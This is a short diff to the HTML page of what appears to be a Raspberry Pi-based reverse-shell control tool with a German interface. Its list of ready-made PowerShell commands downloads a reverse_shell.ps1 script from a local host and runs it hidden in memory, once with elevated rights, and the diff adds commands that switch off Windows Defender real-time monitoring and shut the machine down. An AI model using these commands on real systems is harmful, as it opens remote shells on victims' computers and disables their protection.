@@ -272,6 +272,9 @@ $('.examples').removeClass('hidden');
       <li style="color:#f43">WGET "http://raspberrypi.local/files/reverse_shell.ps1" -UseBasicParsing -OutFile "reverse-shell.ps1"</li>
       <li style="color:#f1c">Start-Process powershell.exe -ArgumentList "IEX (New-Object Net.WebClient).DownloadString('http://raspberrypi.local/files/reverse_shell.ps1');" -WindowStyle Hidden; exit</li>
       <li style="color:#f1c">Start-Process powershell.exe -ArgumentList "IEX (New-Object Net.Webclient).DownloadString('http://raspberrypi.local/files/reverse_shell.ps1');" -WindowStyle Hidden -verb runas; exit</li>
+      <li style="color:#f1c">Set-MpPreference -DisableRealtimeMonitoring $false</li>
+      <li style="color:#f1c">Set-MpPreference -DisableRealtimeMonitoring $true</li>
+      <li style="color:#f1c">Stop-computer</li>
     </ul>
   </div>
   <div class="noshelloverlay"><span>Keine offene Reverse-Shell-Verbindung gefunden</span></div>
